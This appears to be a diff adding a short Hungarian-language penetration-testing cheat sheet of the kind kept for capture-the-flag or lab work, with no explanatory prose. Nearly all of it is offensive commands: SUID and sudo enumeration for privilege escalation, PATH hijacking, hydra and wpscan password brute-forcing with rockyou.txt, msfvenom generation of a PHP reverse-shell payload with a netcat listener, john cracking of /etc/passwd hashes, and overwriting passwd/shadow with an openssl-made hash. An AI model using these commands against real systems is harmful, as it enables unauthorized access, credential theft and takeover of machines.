@@ -1,0 +1,72 @@
+SUID bitek
+find / -perm -u=s 2>/dev/null  (-type f)
+sudo -l
+su felhasználónév
+
+export PATH=/tmp:$PATH
+which <command>
+
+DNS helye:
+/etc/hosts
+SSH kulcs helye:
+~/.ssh
+
+https://gtfobins.github.io
+https://www.exploit-db.com
+
+nmap -sS -p- -sV
+sudo nmap -sS -sC –script vuln
+
+nyitott portok:
+ss -tlnp
+
+basic-auth
+dirbusterrel
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.0.0.0 http-get /admin
+
+
+Reverse shell
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
+
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+nc -lvnp 4444
+msf multi/handler
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+wpscan --url <url> -e at,ap,u
+wpscan --url <url> -U <talált_username> -P /usr/share/wordlists/rockyou.txt
+
+john </etc/passwd key> --wordlist=/usr/share/wordlists/rockyou.txt 
+john </etc/passwd key> --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt $y$
+
+Ha van írási jogunk passwd/shadowra
+openssl passwd parancs
+openssl passwd -6 (sha-512) alma
+
+python3 -m http.server
+wget
+
+getfacl <location> 
+
+ignore
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/bin/traceroute6
+/bin/sudo
+/bin/passwd
+/usr/bin/crontab
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/libexec/openssh/ssh-keysign
+/usr/libexec/utempter/utempter
+/usr/sbin/lpc
+/usr/sbin/lppasswd
+/usr/sbin/lpq
+/usr/sbin/lprm
+
+df lemezkimenet
+
